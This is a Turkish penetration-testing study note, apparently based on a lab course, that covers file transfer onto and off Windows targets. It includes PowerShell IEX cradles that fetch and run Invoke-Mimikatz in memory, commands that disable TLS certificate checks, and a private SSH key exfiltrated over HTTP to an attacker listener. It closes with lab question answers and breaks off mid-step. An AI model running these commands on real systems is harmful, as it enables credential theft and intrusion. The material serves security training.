---
glightbox: true
icon: material/help
---

# Windows File Transfer Methods

## Introduction

Dosya transferlerine güzel bir örnek olarak [Microsoft Astaroth](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) saldırısı verilebilir:

![](../assets/images/astaroth-attack-chain.png)

Bu saldırının hazırlanması esnasında birden fazla dosya transfer yöntemi kullanılmıştır.

## Download Operations

### PowerShell Base64 Encode & Decode

Dosya transferi gerçekleştirileceği zaman, aktarmak istediğimiz dosya boyutuna göre ağ iletişimi gerektirmeyen yöntemler kullanılabilir. Örneğin bir dosyayı Base64 olarak kodlayabilir ve içeriğini terminale kopyalayabiliriz.

Linux makinesinde bulunan bir SSH anahtarını Windows makinesine kopyalamak isteyelim. Öncelikle anahtar dosyasını Base64 ile kodlayalım:

```bash
cat id_rsa | base64 -w 0; echo
```

```text title="Output"
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Çıktıda elde edilen bu string, Windows makinesinde PowerShell yardımıyla kodu çözüldükten sonra dosya olarak kaydedilebilir:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Son olarak Linux ve Windows makinelerinde bulunan `id_rsa` dosyalarının MD5 çıktılarını kontrol edebiliriz. İki çıktı da aynı ise kopyalama başarılı olmuştur.

Linux makinesinde MD5 hash elde etmek için aşağıdaki komut kullanılabilir:

```bash
md5sum id_rsa
```

```text title="Output"
4e301756a07ded0a2dd6953abf015278  id_rsa
```

Windows makinesinde MD5 hash elde etmek için aşağıdaki komut kullanılabilir:

```powershell
Get-FileHash "C:\Users\Public\id_rsa" -Algorithm MD5
```

```text title="Output"
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

Bu yöntem kullanışlı olsa da her zaman kullanılamaz. Çünkü Windows CMD için maksimum dize uzunluğu 8191 karakterdir. Ayrıca çok büyük dizeler göndermeye çalışırsanız web shell hata verebilir.

### PowerShell DownloadFile Method

Bir kaynaktan veri indirmek için [System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-8.0) sınıfına ait `DownloadFile` metodu kullanılabilir:

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

Çağıran iş parçacığını engellemeden bir kaynaktan veri indirmek için ise `DownloadFileAsync` metodu kullanılabilir:

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

### PowerShell DownloadString - Fileless Method

Dosyasız (fileless) saldırılar, veriyi indirmek ve doğrudan yürütmek için bazı işletim sistemi işlevlerini kullanır. PowerShell dosyasız saldırılar gerçekleştirmek için kullanılabilir. Bir PowerShell script dosyasını diske indirmek yerine IEX ([Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4)) Cmdlet kullanılarak doğrudan bellekte çalıştırabiliriz:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX aynı zamanda aşağıdaki şekilde pipeline girdisi ile de kullanılabilir:

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

PowerShell 3.0 ve sonrasında `Invoke-WebRequest` Cmdlet kullanılabilir. Alias olarak `iwr`, `curl` ve `wget` kullanılabilir:

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

[Bu](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) sitede PowerShell ile kullanılabilecek bazı download cradle komutları bulunmaktadır.

### Common Errors with PowerShell

Internet Explorer tarayıcısının ilk başlatma yapılandırması tamamlanmamış ise indirme işlemleri başarısız olabilir.

![](../assets/images/ie-settings.png)

Herhangi bir hatanın oluşmaması için `UseBasicParsing` parametresi kullanılabilir:

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

PowerShell indirmelerinde karşılaşılabilecek bir diğer hata, SSL/TLS kanalında sertifikaya güvenilmemesi durumudur.

Herhangi bir hatanın oluşmaması için aşağıdaki komut kullanılabilir:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Bunun ardından aşağıdaki şekilde indirme gerçekleştirilebilir:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

### SMB Downloads

SMB protokolü Windows hizmetlerinin çalıştığı kurumsal ağlarda yaygındır. Uygulamaların ve kullanıcıların uzak sunuculara veya sunuculardan dosya aktarmasına olanak tanır.

Linux makinemizde SMB sunucusu kurmak için Impacket [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) aracını kullanabiliriz:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Daha sonra Windows makinesinde `copy` komutu ile bu sunucudan dosya indirebiliriz:

```batch
copy \\192.168.220.133\share\nc.exe
```

Bu şekilde kimlik doğrulaması gerçekleştirilmeden yapılan işlemler Windows sistemlerinin yeni sürümlerinde işe yaramaz. Bunun için sunucuyu oluştururken bir adet kullanıcı adı ve parola belirlemek gerekir:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Ardından sunucuyu, yerel makinemize mount etmeliyiz:

```batch
net use n: \\192.168.220.133\share /user:test test
```

Artık dosyayı indirebiliriz:

```batch
copy n:\nc.exe
```

### FTP Downloads

Linux makinemizde FTP sunucusu kurmak için Python `pyftpdlib` modülünü kullanabiliriz. Öncelikle bu modülü yüklemeliyiz:

```bash
sudo pip3 install pyftpdlib
```

Ardından port 21 bilgisini vererek FTP sunucusunu kurabiliriz, çünkü bu modül varsayılan olarak 2121 portunu kullanır:

```bash
sudo python3 -m pyftpdlib --port 21
```

Dosyayı Windows makinesinde indirmek için PowerShell kullanabiliriz:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Uzak makineden bir shell aldığımızda bu shell etkileşimli olmayabilir. Durum buysa, dosyayı indirmek için FTP komut dosyası oluşturabiliriz. Ardından istenilen dosyayı indirmek için FTP istemcisini kullanabiliriz.

Yürütmek istediğimiz komutları içeren dosyayı aşağıdaki şekilde oluşturabiliriz:

```batch
echo open 192.168.49.128 > ftpcommand.txt & echo USER anonymous >> ftpcommand.txt & echo binary >> ftpcommand.txt & echo GET file.txt >> ftpcommand.txt & echo bye >> ftpcommand.txt
```

Oluşturulan komut dosyasını kullanarak dosya indirmek için aşağıdaki komutu kullanabiliriz:

```batch
ftp -v -n -s:ftpcommand.txt
```

## Upload Operations

İndirme işlemleri için kullandığımız yöntemlerin aynısını yüklemeler için de kullanabiliriz.

### PowerShell Base64 Encode / Decode

PowerShell kullanarak bir Base64 dizesinin kodunun nasıl çözüleceğini gördük. Şimdi işlemin tersini yapalım ve bir dosyayı kodlayalım. Böylece bu dosyayı saldırı makinemizde çözebiliriz:

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Users\Public\id_rsa" -AsByteStream))
```

!!! info "AsByteStream"

    `Get-Content` kullanımında `parameter cannot be found` hatası alırsan `-AsByteStream` yerine `-Raw -Encoding Byte` kullanmayı deneyebilirsin.

```text title="Output"
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Çıktıda elde edilen bu string, Linux makinesinde `base64` aracı kullanılarak kodu çözüldükten sonra dosya olarak kaydedilebilir:

```bash
echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo= | base64 -d > id_rsa
```

Son olarak Linux ve Windows makinelerinde bulunan `id_rsa` dosyalarının MD5 çıktılarını kontrol edebiliriz. İki çıktı da aynı ise kopyalama başarılı olmuştur.

Windows makinesinde MD5 hash elde etmek için aşağıdaki komut kullanılabilir:

```powershell
Get-FileHash "C:\Users\Public\id_rsa" -Algorithm MD5 | select Hash
```

```text title="Output"
Hash
----
4E301756A07DED0A2DD6953ABF015278
```

Linux makinesinde MD5 hash elde etmek için aşağıdaki komut kullanılabilir:

```bash
md5sum id_rsa
```

```text title="Output"
4e301756a07ded0a2dd6953abf015278  id_rsa
```

### PowerShell Web Uploads

PowerShell yükleme işlemleri için yerleşik işlevler içermez. Ancak yükleme işlevimizi oluşturmak için `Invoke-WebRequest` veya `Invoke-RestMethod` komutları kullanılabilir. Ayrıca yüklemeleri kabul eden bir web sunucusuna da ihtiyacımız olacak. Bu, çoğu yaygın web sunucusu programında varsayılan seçenek değildir.

Web sunucumuz için Python [http.server](https://docs.python.org/3/library/http.server.html) modülünün dosya yüklemeleri için genişletilmiş bir versiyonu olan [uploadserver](https://github.com/Densaugeo/uploadserver) modülünü kullanabiliriz:

```bash
python3 -m uploadserver
```

Yükleme işlemlerini gerçekleştirmek için [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) script dosyasını kullanabiliriz. Öncelikle bu script dosyasını indirelim:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Bu script `Invoke-FileUpload` fonksiyonunu içerir ve bu fonksiyon `File` ve `Uri` olmak üzere iki adet değere ihtiyaç duyar.

Gerekli değerleri fonksiyona sağlayarak ilgili dosyayı Python ile oluşturduğumuz sunucuya yükleyebiliriz:

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File "C:\Users\Public\id_rsa"
```

### PowerShell Base64 Web Upload

Yükleme işlemleri için PowerShell ve Base64 kodlu dosyaları kullanmanın bir başka yolu da Netcat ile `Invoke-WebRequest` veya `Invoke-RestMethod` kullanmaktır.

İlk olarak Netcat ile belirli bir portu dinlemeye başlarız:

```bash
nc -lvnp 8000
```

Base64 dizesini bir değişkende tutalım:

```powershell
$b64 = [Convert]::ToBase64String((Get-Content -Path "C:\Windows\Public\id_rsa" -AsByteStream))
```

!!! info "AsByteStream"

    `Get-Content` kullanımında `parameter cannot be found` hatası alırsan `-AsByteStream` yerine `-Raw -Encoding Byte` kullanmayı deneyebilirsin.

Bu değişkenin değerini POST isteği ile daha önceden belirttiğimiz porta gönderelim:

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000 -Method POST -Body $b64
```

Netcat çıktısında, gönderilen dizenin yakalandığı görülebilir. Bu değerin kodunu çözüp bir dosyaya kaydedebiliriz:

```bash
echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo= | base64 -d -w 0 > id_rsa
```

### SMB Uploads

İşletmeler genellikle SMB protokolünün iç ağlarından çıkmasına izin vermez. Çünkü bu durum işletmeyi potansiyel saldırılara açık hale getirebilir.

!!! info "SMP Uploads"

    Herhangi bir SMB kısıtlaması yoksa, daha önceden dosya indirmek için kullandığımız Impacket yöntemi, dosya yüklemek için de kullanılabilir.

Bu durumda SMB, WebDAV (Web Distributed Authoring and Versioning) ile HTTP üzerinden çalıştırılabilir. WebDAV ([RFC 4918](https://datatracker.ietf.org/doc/html/rfc4918)), web tarayıcılarının ve web sunucularının birbirleriyle iletişim kurmak için kullandıkları internet protokolü olan HTTP protokolünün bir uzantısıdır. WebDAV protokolü, bir web sunucusunun dosya sunucusu gibi davranmasını sağlayarak iş birliğine dayalı içerik yazmayı destekler. WebDAV ayrıca HTTPS protokolünü de kullanabilir.

WebDAV ile SMB kullandığımızda, ilk olarak SMB protokolü ile bağlantı denemesi gerçekleştirilir. Herhangi bir SMB paylaşımı yoksa HTTP kullanarak bağlantı denemesi gerçekleştirilir.

WebDAV sunucumuzu kurmak için `wsgidav` ve `cheroot` isimli iki adet Python modülüne ihtiyaç duyarız:

```bash
sudo pip install wsgidav cheroot
```

Modüller kurulduktan sonra hedef dizinde `wsgidav` uygulamasını çalıştırıyoruz:

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```text title="Output"
[sudo] password for plaintext:
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

Artık `DavWWWRoot` dizinini kullanarak paylaşıma bağlanmayı deneyebiliriz:

```batch
dir \\192.168.49.128\DavWWWRoot
```

```text title="Output"
 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

Burada kullanılan `DavWWWRoot` ifadesi Windows shell tarafından tanınan özel bir anahtar kelimedir, WebDAV sunucusunda böyle bir klasör yoktur. Bu ifade, WebDAV sunucusunun köküne bağlanmanıza ilişkin WebDAV isteklerini işleyen `Mini-Redirector` sürücüsüne bilgi verir.

Sunucuda bulunan bir klasöre bağlanmak istersek bu ifade yerine ilgili klasörün adını kullanmalıyız.

### FTP Uploads

FTP kullanarak dosya yüklemek dosya indirmeye çok benzer. İşlemi tamamlamak için PowerShell veya FTP istemcisini kullanabiliriz. Python `pyftpdlib` modülünü başlatmadan önce, istemcilerin saldırı makinemize dosya yüklemesine izin vermek için `--write` seçeneğini belirtmemiz gerekir:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Dosyayı yüklemek için PowerShell kullanabiliriz:

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

FTP komut dosyası kullanmak istersek aşağıdaki gibi bir dosya oluşturabiliriz. Burada `GET` yerine `PUT` kullanıldığına dikkat edilmelidir:

```batch
echo open 192.168.49.128 > ftpcommand.txt & echo USER anonymous >> ftpcommand.txt & echo binary >> ftpcommand.txt & echo PUT file.txt >> ftpcommand.txt & echo bye >> ftpcommand.txt
```

Oluşturulan komut dosyasını kullanarak dosya yüklemek için aşağıdaki komutu kullanabiliriz:

```batch
ftp -v -n -s:ftpcommand.txt
```

## Questions

```text
Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.
```

??? tip "Steps"

    ```bash
    wget 10.129.201.55/flag.txt
    cat flag.txt
    ```

```text
Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, RDP to the box, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
```

??? tip "Steps"

    Soruda verilen dosyayı Base64 ile kodla:

    ```powershell
    [Convert]::ToBase64String((Get-Content ".\upload_win.zip" -AsByteStream))
    ```

    ```text title="Output"
